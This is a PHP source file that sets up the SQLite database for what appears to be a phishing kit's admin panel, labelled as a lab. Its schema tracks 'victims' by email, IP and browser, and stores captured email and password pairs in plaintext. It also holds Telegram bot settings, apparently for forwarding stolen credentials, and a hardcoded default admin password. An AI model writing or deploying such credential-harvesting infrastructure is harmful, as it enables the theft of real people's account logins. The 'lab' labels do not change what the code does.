<?php
/* ============================================
   DB CONFIG — SQLITE (NO SETUP REQUIRED)
   ============================================
   The database file is auto-created on first use.
   No MySQL / phpMyAdmin needed.
   ============================================ */

/* Database file path */
define('DB_PATH', __DIR__ . '/db/lab_admin.sqlite');

/* ============================================
   CONNECTION + AUTO-SCHEMA INIT
   ============================================ */
function _db() {
    static $pdo = null;
    if ($pdo === null) {
        $dir = dirname(DB_PATH);
        if (!is_dir($dir)) { mkdir($dir, 0755, true); }
        try {
            $pdo = new PDO('sqlite:' . DB_PATH, null, null, array(
                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES   => false,
            ));
            $pdo->exec('PRAGMA journal_mode=WAL');
            $pdo->exec('PRAGMA foreign_keys=ON');
            _init_schema($pdo);
        } catch (PDOException $e) {
            $GLOBALS['_db_error'] = $e->getMessage();
            error_log('[DB] ' . $e->getMessage());
            return null;
        }
    }
    return $pdo;
}

/* ============================================
   AUTO-CREATE TABLES ON FIRST RUN
   ============================================ */
function _init_schema($pdo) {
    /* Check if tables exist */
    $tables = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name='admins'")->fetch();
    if ($tables) { return; }

    $pdo->exec("
        CREATE TABLE admins (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            username  TEXT NOT NULL UNIQUE,
            password  TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");
    /* Default admin: admin / LabTest2026! */
    $hash = password_hash('LabTest2026!', PASSWORD_DEFAULT);
    $pdo->prepare("INSERT INTO admins (username,password) VALUES (?,?)")->execute(array('admin', $hash));

    $pdo->exec("
        CREATE TABLE victims (
            id         TEXT PRIMARY KEY,
            email      TEXT NOT NULL,
            ip_address TEXT DEFAULT NULL,
            user_agent TEXT DEFAULT NULL,
            status     TEXT NOT NULL DEFAULT 'pending' CHECK(status IN ('pending','accessed','captured')),
            created_by INTEGER DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");

    $pdo->exec("
        CREATE TABLE captures (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id  TEXT DEFAULT NULL,
            email      TEXT NOT NULL,
            password   TEXT NOT NULL,
            attempt    INTEGER NOT NULL DEFAULT 1,
            ip_address TEXT DEFAULT NULL,
            user_agent TEXT DEFAULT NULL,
            page_url   TEXT DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");

    $pdo->exec("
        CREATE TABLE settings (
            setting_key   TEXT PRIMARY KEY,
            setting_value TEXT NOT NULL,
            updated_at    DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");
    $pdo->prepare("INSERT OR IGNORE INTO settings (setting_key,setting_value) VALUES (?,?)")->execute(array('target_email', 'lab_instructor@example.com'));
    $pdo->prepare("INSERT OR IGNORE INTO settings (setting_key,setting_value) VALUES (?,?)")->execute(array('base_url', ''));
    $pdo->prepare("INSERT OR IGNORE INTO settings (setting_key,setting_value) VALUES (?,?)")->execute(array('telegram_bot', ''));
    $pdo->prepare("INSERT OR IGNORE INTO settings (setting_key,setting_value) VALUES (?,?)")->execute(array('telegram_chat', ''));

    $pdo->exec("
        CREATE TABLE audit_log (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id   INTEGER DEFAULT NULL,
            action     TEXT NOT NULL,
            details    TEXT DEFAULT NULL,
            ip_address TEXT DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ");
}

/* Session helper */
function _sess($k, $v = null) {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    if ($v !== null) {
        $_SESSION[$k] = $v;
        return $v;
    }
    return $_SESSION[$k] ?? null;
}
